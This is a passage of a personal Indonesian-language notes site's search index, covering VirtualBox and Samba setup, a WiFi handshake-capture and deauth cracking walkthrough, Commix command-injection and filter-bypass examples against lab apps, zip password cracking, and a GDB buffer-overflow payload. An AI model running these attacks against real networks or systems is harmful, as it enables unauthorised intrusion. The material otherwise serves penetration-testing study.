compgen -g add group : sudo usermod -a -G vboxusers $USER kyknya perlu di reboot","title":"Extension Pack"},{"location":"tips/virtualbox/#copy-file-host-ke-remote-dan-sebaliknya","text":"mengirim dari host ke remote : file : scp <file_yg_akan_dikirim> <user_remote>@<ip_remote>:<directory_tujuan> directory : scp -r <directory_yg_dikirim> <user_remote>@<ip_remote>:<directory_tujuan> mengambil file dari remote : scp <user_remote>@<ip_remote>:<file_directorynya> <tujuan_di_directorymu> jika menghendaki ada port dan key scp <user_remote>@<ip_remote>:<file_directorynya> <tujuan_di_directorymu> -P <port> -i <path_key>","title":"Copy file host ke remote, dan sebaliknya"},{"location":"tips/virtualbox/#windows-iso","text":"drive , sudah dihapus google :V","title":"Windows ISO"},{"location":"tips/virtualbox/#membuat-file-sharing-virtualbox","text":"connect ssh : pc-target : sudo service ssh status sudo service ssh start silahkan ssh namun, jika masih tdk bisa : sudo iptables -A INPUT -p tcp --dport ssh -j ACCEPT host : mkdir -p /mnt/cobafilesharing-public mkdir -p /mnt/cobafilesharing-data server : <ul> sudo su mkdir /home/public mkdir /home/data apt update apt -y install samba cifs-utils vi /etc/samba/smb.conf diisi dengan : workgroup = WORKGROUP netbios name = COBAFILESHARING # dibagian bottom [public] path = /home/public available = yes browsable = yes public = yes writable = yes [data] path = /home/data available = yes browsable = yes public = yes writable = no mkdir -p /home/public mkdir -p /home/data chown -Rf nobody.nogroup /home/public chown -Rf nobody.nogroup /home/data chmod -Rf 777 /home/public chmod -Rf 777 /home/data smbpasswd -a carloz misal password : 123456 /etc/init.d/smbd restart matikan firewall ufw disable host : cek sdh mount apa blm : df -h mount -t cifs //192.168.43.207/public/ /mnt/cobafilesharing-public/ -o password=123456,username=carloz Done, jika ingin sharing file bisa lewat folder tersebut","title":"Membuat file sharing virtualbox"},{"location":"tips/virtualbox/#resize-memory-virtualbox","text":"VBoxManage clonehd Ubuntu\\ Server\\ 18.04\\ LTS.vdi ubuntu18_04_new4.vdi --format VDI --variant Standard VBoxManage modifyhd ubuntu18_04_new4.vdi --resize 30000 ganti storage lewat GUI virtualbox","title":"Resize memory virtualbox"},{"location":"tips/virtualbox/#error-kernel-driver-not-installed-rc-1908","text":"sudo apt-get remove virtualbox-dkms sudo apt-get install virtualbox-dkms sudo apt update reboot jika perlu","title":"Error : Kernel driver not installed (rc=-1908)"},{"location":"tips/wifihack/","text":"Monitoring and Cracking WiFi with Aircrack-ng \u00b6 Skema \u00b6 Prerequisite \u00b6 Access Point / Wifi (Terserah, Saya menggunakan TP-Link TL-WR840N) Kali Linux Victim Simulasi yang Saya gunakan (Dapat disesuaikan dengan perlengkapan seadanya) Access Point -> TP-Link TL-WR840N (pasang password yang mudah saja untuk percobaan ) VirtualBox -> Kali Linux Wifi Adapter -> *TP-Link TL-WN722N V1 *) disarankan menggunakan wifi adapter agar aman. TP-Link menggunakan V1, untuk V2/V3 membutuhkan install driver (tutorial di youtube banyak) Masang USB Adapter \u00b6 cek dengan iwconfig \u250c\u2500\u2500(kali\u327fkali)-[~] \u2514\u2500$ iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:off Persiapan: Airmon-ng \u00b6 lakukan airmon-ng check kill agar program yang berjalan tidak menginterfensi perubahan channel atau dapat dengan kill 455 kill 2451 Jika dilakukan ifconfig / ifconfig maka akan terlihat interface sudah berubah menjadi wlan0mon yang menandakan mode monitor \u250c\u2500\u2500(root\u327fkali)-[/home/kali] \u2514\u2500# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:off Scanning: Airodump-ng \u00b6 Mencari MAC Address dan channel Access Point airodump-ng wlan0mon Terlihat untuk ESSID TP-Link_C21A memiliki BSSID AC:15:A2:A2:C2:1A dan channel 1 Dapat hentikan scan dengan ^C Capture: Monitor & Capture Handshake \u00b6 Mencari MAC Address target jalankan monitor ke spesifik target dan capture handshake airodump-ng -c 1 --bssid AC:15:A2:A2:C2:1A -w hacking-wifi wlan0mon *tetap biarkan berjalan -c, channel 1 --bssid, mac access point -w, nama file output wlan0mon, interface yang mau dimonitor AC:15:A2:A2:C2:1A, MAC Access Point 16:E5:A3:D5:4E:63, MAC Victim Hack: Aireplay-ng \u00b6 mengirim paket Deauth untuk memutus client dari AP, tujuan agar client terkoneksi ulang, dan kita mengcapture handshake *buka tab baru terminal aireplay-ng --deauth 2 -a AC:15:A2:A2:C2:1A -c 16:E5:A3:D5:4E:63 wlan0mon --deauth, mengirimkan packet deauth attack sebanyak 2x -a, MAC AP -c, MAC victim Cracking: Aircrack-ng \u00b6 aircrack-ng -w wordlist.txt hacking-wifi-01.cap Stop Monitoring \u00b6 airmon-ng stop wlan0mon service NetworkManager restart","title":"Wifi Hacking"},{"location":"tips/wifihack/#monitoring-and-cracking-wifi-with-aircrack-ng","text":"","title":"Monitoring and Cracking WiFi with Aircrack-ng"},{"location":"tips/wifihack/#skema","text":"","title":"Skema"},{"location":"tips/wifihack/#prerequisite","text":"Access Point / Wifi (Terserah, Saya menggunakan TP-Link TL-WR840N) Kali Linux Victim Simulasi yang Saya gunakan (Dapat disesuaikan dengan perlengkapan seadanya) Access Point -> TP-Link TL-WR840N (pasang password yang mudah saja untuk percobaan ) VirtualBox -> Kali Linux Wifi Adapter -> *TP-Link TL-WN722N V1 *) disarankan menggunakan wifi adapter agar aman. TP-Link menggunakan V1, untuk V2/V3 membutuhkan install driver (tutorial di youtube banyak)","title":"Prerequisite"},{"location":"tips/wifihack/#masang-usb-adapter","text":"cek dengan iwconfig \u250c\u2500\u2500(kali\u327fkali)-[~] \u2514\u2500$ iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=20 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:off","title":"Masang USB Adapter"},{"location":"tips/wifihack/#persiapan-airmon-ng","text":"lakukan airmon-ng check kill agar program yang berjalan tidak menginterfensi perubahan channel atau dapat dengan kill 455 kill 2451 Jika dilakukan ifconfig / ifconfig maka akan terlihat interface sudah berubah menjadi wlan0mon yang menandakan mode monitor \u250c\u2500\u2500(root\u327fkali)-[/home/kali] \u2514\u2500# iwconfig lo no wireless extensions. eth0 no wireless extensions. wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=20 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:off","title":"Persiapan: Airmon-ng"},{"location":"tips/wifihack/#scanning-airodump-ng","text":"Mencari MAC Address dan channel Access Point airodump-ng wlan0mon Terlihat untuk ESSID TP-Link_C21A memiliki BSSID AC:15:A2:A2:C2:1A dan channel 1 Dapat hentikan scan dengan ^C","title":"Scanning: Airodump-ng"},{"location":"tips/wifihack/#capture-monitor-capture-handshake","text":"Mencari MAC Address target jalankan monitor ke spesifik target dan capture handshake airodump-ng -c 1 --bssid AC:15:A2:A2:C2:1A -w hacking-wifi wlan0mon *tetap biarkan berjalan -c, channel 1 --bssid, mac access point -w, nama file output wlan0mon, interface yang mau dimonitor AC:15:A2:A2:C2:1A, MAC Access Point 16:E5:A3:D5:4E:63, MAC Victim","title":"Capture: Monitor &amp; Capture Handshake"},{"location":"tips/wifihack/#hack-aireplay-ng","text":"mengirim paket Deauth untuk memutus client dari AP, tujuan agar client terkoneksi ulang, dan kita mengcapture handshake *buka tab baru terminal aireplay-ng --deauth 2 -a AC:15:A2:A2:C2:1A -c 16:E5:A3:D5:4E:63 wlan0mon --deauth, mengirimkan packet deauth attack sebanyak 2x -a, MAC AP -c, MAC victim","title":"Hack: Aireplay-ng"},{"location":"tips/wifihack/#cracking-aircrack-ng","text":"aircrack-ng -w wordlist.txt hacking-wifi-01.cap","title":"Cracking: Aircrack-ng"},{"location":"tips/wifihack/#stop-monitoring","text":"airmon-ng stop wlan0mon service NetworkManager restart","title":"Stop Monitoring"},{"location":"tips/wlan-monitor-mode/","text":"Wlan Monitor Mode (!) Masih gagal, kyknya krn adapter wifi krng gahar *update: wifi hack cek interface wifi : iwconfig atau airmon-ng punyaku pakai wlp2s0 Change Mac Address : ifconfig wlp2s0 down macchanger --random wlp2s0 ifconfig wlp2s0 up connect wifi dulu wifi monitor mode : cara 1 : mode monitor : airmon-ng start wlp2s0 gambar wifi hilang, tdk bs buat internetan, santuy emg gitu cek mode : iwconfig wlp2s0mon jika sudahan : airmon-ng stop wlp2s0mon cek : iwconfig wlp2s0 cara 2 : men-down wlp2s0 : ifconfig wlp2s0 down mode monitor : airmon-ng start wlp2s0 cek : iwconfig wlp2s0mon men-up : # gunanya apa? ifconfig wlp2s0mon up men-down : airmon-ng stop wlp2s0mon kill all process airmon-ng : airmon-ng check kill cara 3 : mode monitor : airmon-ng start wlp2s0 meng-up : ifconfig wlp2s0mon up mendisable : airmon-ng stop wlp2s0 airmon-ng stop wlp2s0mon cara 4 : mode monitor : iwconfig wlp2s0 mode monitor cek : iwconfig wlp2s0 mode managed : iwconfig wlp2s0 mode managed intinya : cara sistem : airmon-ng start wlp2s0 airmon-ng stop wlp2s0mon cara manual : iwconfig wlp2s0 mode monitor iwconfig wlp2s0 mode managed tracking : airodump-ng wlp2s0mon (*)Note jika setelah airomon-ng check kill terjadi problem, seperti wifi tidak muncul lagi, service NetworkManager restart jangan lupa mengubah mode menjadi managed : airmon-ng stop wlp2s0mon atau iwconfig wlp2s0 mode managed cek : iwconfig mungkin jika perlu ifconfig wlp2s0 up alternatif airomon-ng check kill (not recommended) : ifconfig wlp2s0 down iwconfig wlp2s0 mode monitor ifconfig wlp2s0 up aireplay-ng wlp2s0 # ga bisa ifconfig wlp2s0 down : wifi emg masih nyala, tp sebetulnya mati/ga nyambung internet","title":"Wlan Monitor Mode"},{"location":"tool/archive/","text":"Archive File \u00b6 Zip \u00b6 make zip password file zip -re output_file.zip file1 folder1 Jika lupa password : (asumsi password mudah / ada dalam wordlist) https://www.lostmypass.com/file-types/rar/ https://www.lostmypass.com/file-types/zip/ https://www.lostmypass.com/file-types/7z/","title":"Archive File"},{"location":"tool/archive/#archive-file","text":"","title":"Archive File"},{"location":"tool/archive/#zip","text":"make zip password file zip -re output_file.zip file1 folder1 Jika lupa password : (asumsi password mudah / ada dalam wordlist) https://www.lostmypass.com/file-types/rar/ https://www.lostmypass.com/file-types/zip/ https://www.lostmypass.com/file-types/7z/","title":"Zip"},{"location":"tool/burpsuite/","text":"Burp Suite \u00b6","title":"Burp Suite"},{"location":"tool/burpsuite/#burp-suite","text":"","title":"Burp Suite"},{"location":"tool/commix/","text":"Commix \u00b6 https://github.com/commixproject/commix Commix (short for [ comm ]and [ i ]njection e[ x ]ploiter) is an open source penetration testing tool, written by Anastasios Stasinopoulos ( @ancst ), that automates the detection and exploitation of command injection vulnerabilities. Usage Examples Filters Bypasses Usage Examples \u00b6 1. Exploiting Damn Vulnerable Web App : \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#\" --data = \"ip=127.0.0.1&Submit=submit\" --cookie = \"security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4\" 2. Exploiting php-Charts 1.0 using injection payload suffix & prefix string: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test\" --prefix = \"'\" --suffix = \"//\" 3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php\" --data = \"target_host=127.0.0.1\" --headers = \"Accept-Language:fr\\nETag:123\\n\" --proxy = \"127.0.0.1:8081\" 4. Exploiting Persistence : \u00b6 Using ICMP exfiltration technique: root@kali:~/commix# python commix.py --url = \"http://192.168.178.8/debug.php\" --data = \"addr=127.0.0.1\" --icmp-exfil = \"ip_src=192.168.178.5,ip_dst=192.168.178.8\" Using an alternative (python) shell: root@kali:~/commix# python commix.py --url = \"http://192.168.178.8/debug.php\" --data = \"addr=127.0.0.1\" --alter-shell = \"Python\" 5. Exploiting Damn Vulnerable NodeJS Application (DVNA) : \u00b6 root@kali:~/commix# python commix.py --url \"http://127.0.0.1:9090/app/ping\" --data \"address=127.0.0.1\" --cookie = \"connect.sid=s%3AIdvte5ieuGQC5C8jt5aSyUTSF8xZtls8.3fwCVsyypx%2BLGXtiF1JTBrqbmjp%2B29vwKoL0uxcHub8\" -v1 6. Exploiting Kioptrix: Level 1.1 (#2) : \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.2/pingit.php\" --data = \"ip=127.0.0.1E&submit=submit\" --auth-url = \"http://192.168.178.2/index.php\" --auth-data = \"uname=admin&psw=%27+OR+1%3D1--+-&btnLogin=Login\" 7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&pdf=make\" --user-agent = \"Mozilla/4.0 Mozilla4_browser\" --technique = \"f\" --root-dir = \"/\" 8. Exploiting CVE-2014-6271/Shellshock : \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.178.4/cgi-bin/status/\" --shellshock 9. Exploiting commix-testbed (cookie) using cookie-based injection: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php\" --cookie = \"addr=127.0.0.1\" 10. Exploiting commix-testbed (user-agent) using ua-based injection: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php\" --level = 3 11. Exploiting commix-testbed (referer) using referer-based injection: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php\" --level = 3 12. Exploiting Flick 2 using custom headers and base64 encoding option: \u00b6 root@kali:~/commix# python commix.py --url = \"https://192.168.2.12/do/cmd/*\" --headers = \"X-UUID:commix\\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF\" --base64 13. Exploiting commix-testbed (JSON-based) using JSON POST data: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php\" --data = '{\"addr\":\"127.0.0.1\",\"name\":\"ancst\"}' 14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy: \u00b6 root@kali:~/commix# python commix.py --url = \"http://192.168.2.8/cgi-bin/status\" --shellshock --proxy = \"192.168.2.8:3128\" Filters Bypasses \u00b6 Note: The following filters bypasses are based on dockerized version of Commix-testbed. Filter lax_domain_name.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/lax_domain_name.php\" --data = \"addr=127.0.0.1\" --prefix = \"a.b.c\" --suffix = \"d.e.f\" Filter nested_quotes.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/nested_quotes.php\" --data = \"addr=127.0.0.1\" --prefix = \"\\\"\" --suffix = \"\\\"\" Filter no_space.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_space.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter no_space_no_colon_no_pipe_no_ampersand.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" --technique = f --web-root = \"/var/www/commix-testbed.com/public_html/\" --tamper = \"space2htab\" Filter no_space_no_colon_no_pipe_no_ampersand_no_dollar.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" --technique = f --web-root = \"/var/www/commix-testbed.com/public_html/\" --tamper = \"space2htab\" Filter no_colon_no_pipe_no_ampersand_no_dollar.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" Filter no_white_chars.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter no_white_chars_start_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars_start_alphanum.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" --prefix = \"abc\" Filter no_white_chars_stop_alnum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars_stop_alnum.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter simple_stop_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/simple_stop_alphanum.php\" --data = \"addr=127.0.0.1\" --prefix = \"abc\" Filter simple_start_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/simple_start_alphanum.php\" --data = \"addr=127.0.0.1\" Filter multiple_os_commands_blacklisting.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/multiple_os_commands_blacklisting.php\" --data = \"addr=127.0.0.1\" --tamper = \"uninitializedvariable\"","title":"Commix"},{"location":"tool/commix/#commix","text":"https://github.com/commixproject/commix Commix (short for [ comm ]and [ i ]njection e[ x ]ploiter) is an open source penetration testing tool, written by Anastasios Stasinopoulos ( @ancst ), that automates the detection and exploitation of command injection vulnerabilities. Usage Examples Filters Bypasses","title":"Commix"},{"location":"tool/commix/#usage-examples","text":"","title":"Usage Examples"},{"location":"tool/commix/#1-exploiting-damn-vulnerable-web-app","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#\" --data = \"ip=127.0.0.1&Submit=submit\" --cookie = \"security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4\"","title":"1. Exploiting Damn Vulnerable Web App:"},{"location":"tool/commix/#2-exploiting-php-charts-10-using-injection-payload-suffix-prefix-string","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test\" --prefix = \"'\" --suffix = \"//\"","title":"2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:"},{"location":"tool/commix/#3-exploiting-owasp-mutillidae-using-extra-headers-and-http-proxy","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php\" --data = \"target_host=127.0.0.1\" --headers = \"Accept-Language:fr\\nETag:123\\n\" --proxy = \"127.0.0.1:8081\"","title":"3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:"},{"location":"tool/commix/#4-exploiting-persistence","text":"Using ICMP exfiltration technique: root@kali:~/commix# python commix.py --url = \"http://192.168.178.8/debug.php\" --data = \"addr=127.0.0.1\" --icmp-exfil = \"ip_src=192.168.178.5,ip_dst=192.168.178.8\" Using an alternative (python) shell: root@kali:~/commix# python commix.py --url = \"http://192.168.178.8/debug.php\" --data = \"addr=127.0.0.1\" --alter-shell = \"Python\"","title":"4. Exploiting Persistence:"},{"location":"tool/commix/#5-exploiting-damn-vulnerable-nodejs-application-dvna","text":"root@kali:~/commix# python commix.py --url \"http://127.0.0.1:9090/app/ping\" --data \"address=127.0.0.1\" --cookie = \"connect.sid=s%3AIdvte5ieuGQC5C8jt5aSyUTSF8xZtls8.3fwCVsyypx%2BLGXtiF1JTBrqbmjp%2B29vwKoL0uxcHub8\" -v1","title":"5. Exploiting Damn Vulnerable NodeJS Application (DVNA):"},{"location":"tool/commix/#6-exploiting-kioptrix-level-11-2","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.2/pingit.php\" --data = \"ip=127.0.0.1E&submit=submit\" --auth-url = \"http://192.168.178.2/index.php\" --auth-data = \"uname=admin&psw=%27+OR+1%3D1--+-&btnLogin=Login\"","title":"6. Exploiting Kioptrix: Level 1.1 (#2):"},{"location":"tool/commix/#7-exploiting-kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&pdf=make\" --user-agent = \"Mozilla/4.0 Mozilla4_browser\" --technique = \"f\" --root-dir = \"/\"","title":"7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:"},{"location":"tool/commix/#8-exploiting-cve-2014-6271shellshock","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.178.4/cgi-bin/status/\" --shellshock","title":"8. Exploiting CVE-2014-6271/Shellshock:"},{"location":"tool/commix/#9-exploiting-commix-testbed-cookie-using-cookie-based-injection","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php\" --cookie = \"addr=127.0.0.1\"","title":"9. Exploiting commix-testbed (cookie) using cookie-based injection:"},{"location":"tool/commix/#10-exploiting-commix-testbed-user-agent-using-ua-based-injection","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php\" --level = 3","title":"10. Exploiting commix-testbed (user-agent) using ua-based injection:"},{"location":"tool/commix/#11-exploiting-commix-testbed-referer-using-referer-based-injection","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php\" --level = 3","title":"11. Exploiting commix-testbed (referer) using referer-based injection:"},{"location":"tool/commix/#12-exploiting-flick-2-using-custom-headers-and-base64-encoding-option","text":"root@kali:~/commix# python commix.py --url = \"https://192.168.2.12/do/cmd/*\" --headers = \"X-UUID:commix\\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF\" --base64","title":"12. Exploiting Flick 2 using custom headers and base64 encoding option:"},{"location":"tool/commix/#13-exploiting-commix-testbed-json-based-using-json-post-data","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php\" --data = '{\"addr\":\"127.0.0.1\",\"name\":\"ancst\"}'","title":"13. Exploiting commix-testbed (JSON-based) using JSON POST data:"},{"location":"tool/commix/#14-exploiting-sickos-11-using-shellshock-module-and-http-proxy","text":"root@kali:~/commix# python commix.py --url = \"http://192.168.2.8/cgi-bin/status\" --shellshock --proxy = \"192.168.2.8:3128\"","title":"14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:"},{"location":"tool/commix/#filters-bypasses","text":"Note: The following filters bypasses are based on dockerized version of Commix-testbed. Filter lax_domain_name.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/lax_domain_name.php\" --data = \"addr=127.0.0.1\" --prefix = \"a.b.c\" --suffix = \"d.e.f\" Filter nested_quotes.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/nested_quotes.php\" --data = \"addr=127.0.0.1\" --prefix = \"\\\"\" --suffix = \"\\\"\" Filter no_space.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_space.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter no_space_no_colon_no_pipe_no_ampersand.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" --technique = f --web-root = \"/var/www/commix-testbed.com/public_html/\" --tamper = \"space2htab\" Filter no_space_no_colon_no_pipe_no_ampersand_no_dollar.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" --technique = f --web-root = \"/var/www/commix-testbed.com/public_html/\" --tamper = \"space2htab\" Filter no_colon_no_pipe_no_ampersand_no_dollar.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php\" --data = \"addr=127.0.0.1\" Filter no_white_chars.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter no_white_chars_start_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars_start_alphanum.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" --prefix = \"abc\" Filter no_white_chars_stop_alnum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/no_white_chars_stop_alnum.php\" --data = \"addr=127.0.0.1\" --tamper = \"space2ifs\" Filter simple_stop_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/simple_stop_alphanum.php\" --data = \"addr=127.0.0.1\" --prefix = \"abc\" Filter simple_start_alphanum.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/simple_start_alphanum.php\" --data = \"addr=127.0.0.1\" Filter multiple_os_commands_blacklisting.php bypass: python commix.py --url = \"http://127.0.0.1/scenarios/filters/multiple_os_commands_blacklisting.php\" --data = \"addr=127.0.0.1\" --tamper = \"uninitializedvariable\"","title":"Filters Bypasses"},{"location":"tool/curl/","text":"Curl \u00b6 curl [options] [URL...] standar : curl \"http://blablabla.com\" save to file : curl -o tes.txt \"http://halo.com\" curl -O \"http://halo.com\" show header : curl -I \"http://halo.com\" ganti user agent : curl -A \"haloo web browser\" -v \"http://halo.com\" kirim form : curl -X \"POST\" -d \"username=admin&password=pass\" \"http://halo.com/index.php?id=10\" cookie : curl --cookie \"name=Daniel\" http://www.example.com","title":"Curl"},{"location":"tool/curl/#curl","text":"curl [options] [URL...] standar : curl \"http://blablabla.com\" save to file : curl -o tes.txt \"http://halo.com\" curl -O \"http://halo.com\" show header : curl -I \"http://halo.com\" ganti user agent : curl -A \"haloo web browser\" -v \"http://halo.com\" kirim form : curl -X \"POST\" -d \"username=admin&password=pass\" \"http://halo.com/index.php?id=10\" cookie : curl --cookie \"name=Daniel\" http://www.example.com","title":"Curl"},{"location":"tool/cutter/","text":"Cutter \u00b6 download : https://github.com/rizinorg/cutter/releases install : chmod +x Cutter*.AppImage; ./Cutter*.AppImage bisa ngubah alur, nilai variabel, commit. sbtulnya yg lain jg bisa sih, tp menurutku ini bagus jg","title":"Cutter"},{"location":"tool/cutter/#cutter","text":"download : https://github.com/rizinorg/cutter/releases install : chmod +x Cutter*.AppImage; ./Cutter*.AppImage bisa ngubah alur, nilai variabel, commit. sbtulnya yg lain jg bisa sih, tp menurutku ini bagus jg","title":"Cutter"},{"location":"tool/fcrackzip/","text":"fcrackzip : \u00b6 fcrackzip -v -D -u -p rockyou.txt file.zip","title":"fcrackzip"},{"location":"tool/fcrackzip/#fcrackzip","text":"fcrackzip -v -D -u -p rockyou.txt file.zip","title":"fcrackzip :"},{"location":"tool/gdb/","text":"Install GDB \u00b6 sudo apt install gdb git clone https://github.com/longld/peda.git ~/peda untuk permanen gdb peda tiap run gdb : echo \"source ~/peda/peda.py\" >> ~/.gdbinit tapi jika tidak ingin permanen : gdb source ~/peda/peda.py mencari buffer (jika) : \u00b6 jalankan gdb peda gdb source ~/peda/peda.py pattern create 100 misal didapat pattern : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL lalu run program : run jika diminta input : masukkan input blablabla : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL pokoknya sampai segmentation fault cek offset : pattern offset <memory-offset> misal didapat offset 52, maka tinggal buat payloadnya input payload \u00b6 python -c \"print 'a'*52+'\\xef\\xbe\\xad\\xde'\" | ./(elf) jika berupa running shell (python -c \"print 'a'*52+'\\xef\\xbe\\xad\\xde'\";cat) | ./(elf) *jika hex memory membentuk printable alphabet, maka tulis dengan alpahbet saja web untuk mencari payload shell http://shell-storm.org/shellcode/ input in running gdb \u00b6 (gdb) r <<< $(python -c \"print '\\xde\\xad\\xbe\\xef'\") (gdb) r <<< $(python -c \"print 0xdeadbeef\") *masih kacau (not recommended) Cheat sheet \u00b6 gdb set disassembly intel x main x win p main define hook-stop info register x/10i $eip-8 x/36wx $esp end Objdump \u00b6 objdump -x <file> objdump -d <file> objdump -t <file>","title":"GDB"},{"location":"tool/gdb/#install-gdb","text":"sudo apt install gdb git clone https://github.com/longld/peda.git ~/peda untuk permanen gdb peda tiap run gdb : echo \"source ~/peda/peda.py\" >> ~/.gdbinit tapi jika tidak ingin permanen : gdb source ~/peda/peda.py","title":"Install GDB"},{"location":"tool/gdb/#mencari-buffer-jika","text":"jalankan gdb peda gdb source ~/peda/peda.py pattern create 100 misal didapat pattern : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL lalu run program : run jika diminta input : masukkan input blablabla : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL pokoknya sampai segmentation fault cek offset : pattern offset <memory-offset> misal didapat offset 52, maka tinggal buat payloadnya","title":"mencari buffer (jika) :"},{"location":"tool/gdb/#input-payload","text":"python -c \"print 'a'*52+'\\xef\\xbe\\xad\\xde'\" | ./(elf) jika berupa running shell (python -c \"print 'a'*52+'\\xef\\xbe\\xad\\xde'\";cat) | ./(elf) *jika hex memory membentuk printable alphabet, maka tulis dengan alpahbet saja web untuk mencari payload shell http://shell-storm.org/shellcode/","title":"input 